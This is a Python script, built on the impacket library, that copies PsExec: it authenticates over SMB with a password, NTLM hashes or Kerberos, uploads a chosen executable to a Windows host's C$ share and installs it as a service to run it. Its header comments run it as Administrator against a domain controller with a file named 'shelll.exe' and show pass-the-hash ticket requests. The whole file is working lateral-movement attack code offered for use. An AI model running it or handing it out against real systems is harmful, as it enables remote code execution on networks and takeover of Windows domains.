# python3 bruh.py test.local/Administrator@dc01.test.local -k -no-pass -service-name bigboy -file shelll.exe -debug
# python3 impacket/examples/getTGT.py test.local/Administrator -hashes :wowontlm -dc-ip 192.168.179.3
from impacket import version, smb
from impacket.dcerpc.v5 import transport, epm, nrpc, scmr
from impacket.smbconnection import SMBConnection
from impacket.smb import SMB_DIALECT
from impacket.examples import serviceinstall
from impacket.krb5.keytab import Keytab
from impacket.examples.utils import parse_target
import logging
import argparse

# Parse the command-line arguments
parser = argparse.ArgumentParser(description="Upload and execute a file")
parser = argparse.ArgumentParser(add_help = True, description = "PSEXEC like functionality example using RemComSvc.")

parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
parser.add_argument('-service-name', action='store', metavar="service_name", default = '', help='The name of the service to create that will be used to trigger the payload')
parser.add_argument('-remote-binary-name', action='store', metavar="remote_binary_name", default = None, help='This will be the name of the executable uploaded on the target')
parser.add_argument('-file', action='store', help="The service binary to upload")
parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

group = parser.add_argument_group('authentication')

group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                       '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                       'ones specified in the command line')
group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
group = parser.add_argument_group('connection')

group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
args = parser.parse_args()

domain, username, password, remoteName = parse_target(args.target)

if domain is None:
    domain = ''

if args.target_ip is None:
    args.target_ip = remoteName

if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
    from getpass import getpass
    password = getpass("Password:")

if args.aesKey is not None:
    args.k = True

if args.hashes is not None:
    lmhash, nthash = args.hashes.split(':')

if args.debug is True:
    logging.getLogger().setLevel(logging.DEBUG)
    # Print the Library's installation path
    logging.debug(version.getInstallationPath())
else:
    logging.getLogger().setLevel(logging.INFO)

# Create an SMB connection and authenticate
c = SMBConnection(remoteName=remoteName, remoteHost=remoteName)
if args.k == True:
    c.kerberosLogin(domain = domain, user = username, password = password, kdcHost = args.dc_ip)
elif args.hashes is not None:
    c.login(domain = domain, user = username, password = '', nthash = nthash, lmhash = lmhash)
else:
    c.login(domain = domain, user = username, password = password)

# Upload the file
print("Uploading file %s" % args.file)
with open(args.file, "rb") as f:
    c.putFile("C$", args.file, f.read)
f = open(args.file, 'rb')

# Execute the file
print("Executing file %s" % args.file)
installService = serviceinstall.ServiceInstall(c, f, args.service_name, args.file)
installService.install()
